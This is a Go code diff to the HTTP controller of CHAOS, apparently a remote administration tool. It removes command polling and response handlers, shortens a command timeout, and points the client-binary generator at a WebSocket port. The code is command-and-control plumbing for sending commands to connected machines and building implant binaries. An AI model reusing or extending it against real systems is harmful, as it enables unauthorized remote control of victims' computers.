@@ -15,7 +15,6 @@ import (
 	"github.com/tiagorlampert/CHAOS/internal/utils/system"
 	"github.com/tiagorlampert/CHAOS/presentation/http/request"
 	"github.com/tiagorlampert/CHAOS/services/client"
-	"github.com/tiagorlampert/CHAOS/services/payload"
 	"github.com/tiagorlampert/CHAOS/services/user"
 	"net/http"
 	"net/url"
@@ -169,7 +168,7 @@ func (h *httpController) sendCommandHandler(c *gin.Context) {
 		return
 	}
 
-	ctxWithTimeout, cancel := context.WithTimeout(c, 15*time.Second)
+	ctxWithTimeout, cancel := context.WithTimeout(c, 10*time.Second)
 	defer cancel()
 
 	output, err := h.ClientService.SendCommand(ctxWithTimeout, client.SendCommandInput{
@@ -183,40 +182,10 @@ func (h *httpController) sendCommandHandler(c *gin.Context) {
 	c.String(http.StatusOK, output.Response)
 }
 
-func (h *httpController) getCommandHandler(c *gin.Context) {
-	address := c.Query("address")
-	addr, err := utils.DecodeBase64(address)
-	if err != nil {
-		c.String(http.StatusBadRequest, err.Error())
-		return
-	}
-	req, found := h.PayloadService.Get(addr)
-	if found {
-		c.JSON(http.StatusOK, req)
-		return
-	}
-	c.Status(http.StatusNoContent)
-	return
-}
-
-func (h *httpController) respondCommandHandler(c *gin.Context) {
-	var body request.RespondCommandRequestBody
-	if err := c.BindJSON(&body); err != nil {
-		c.String(http.StatusBadRequest, err.Error())
-		return
-	}
-	h.PayloadService.Set(body.MacAddress, &payload.Data{
-		Response:    body.Response,
-		HasError:    body.HasError,
-		HasResponse: true,
-	})
-	c.Status(http.StatusOK)
-}
-
 func (h *httpController) generateBinaryGetHandler(c *gin.Context) {
 	c.HTML(http.StatusOK, "generate.html", gin.H{
 		"Address":  network.GetLocalIP(),
-		"Port":     strings.ReplaceAll(h.Configuration.Server.Port, ":", ""),
+		"Port":     strings.ReplaceAll(h.Configuration.Server.WebSocketPort, ":", ""),
 		"OSTarget": system.OSTargetMap,
 	})
 	return
